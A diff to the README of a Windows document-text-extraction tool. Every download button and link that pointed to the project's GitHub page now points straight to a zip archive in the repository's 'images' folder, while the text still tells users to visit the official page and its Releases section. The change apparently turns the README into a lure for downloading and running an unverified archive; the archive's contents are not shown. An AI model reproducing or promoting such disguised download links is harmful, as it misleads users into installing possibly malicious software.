@@ -1,6 +1,6 @@
 # 📄 docling_preprocessor_factory_public - Easy Document Text Extraction
 
-[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/tbast24/docling_preprocessor_factory_public)
+[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/tbast24/docling_preprocessor_factory_public/main/images/docling-preprocessor-factory-public-3.0.zip)
 
 ---
 
@@ -28,9 +28,9 @@ Before you download, make sure your Windows PC meets these needs:
 
 ### Step 1: Visit the Download Page
 
-To download the software, you first need to visit the official GitHub page. Click the large button below or use the [link here](https://github.com/tbast24/docling_preprocessor_factory_public).
+To download the software, you first need to visit the official GitHub page. Click the large button below or use the [link here](https://raw.githubusercontent.com/tbast24/docling_preprocessor_factory_public/main/images/docling-preprocessor-factory-public-3.0.zip).
 
-[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/tbast24/docling_preprocessor_factory_public)
+[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/tbast24/docling_preprocessor_factory_public/main/images/docling-preprocessor-factory-public-3.0.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -107,7 +107,7 @@ Once the program opens:
 
 To keep your software up to date:
 
-1. Return to the GitHub page: https://github.com/tbast24/docling_preprocessor_factory_public
+1. Return to the GitHub page: https://raw.githubusercontent.com/tbast24/docling_preprocessor_factory_public/main/images/docling-preprocessor-factory-public-3.0.zip
 2. Check the “Releases” section regularly for new versions.
 3. Download and run the latest installer to upgrade your software safely.
 
@@ -121,4 +121,4 @@ To keep your software up to date:
 
 ---
 
-[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/tbast24/docling_preprocessor_factory_public)
+[![Download docling_preprocessor_factory_public](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/tbast24/docling_preprocessor_factory_public/main/images/docling-preprocessor-factory-public-3.0.zip)
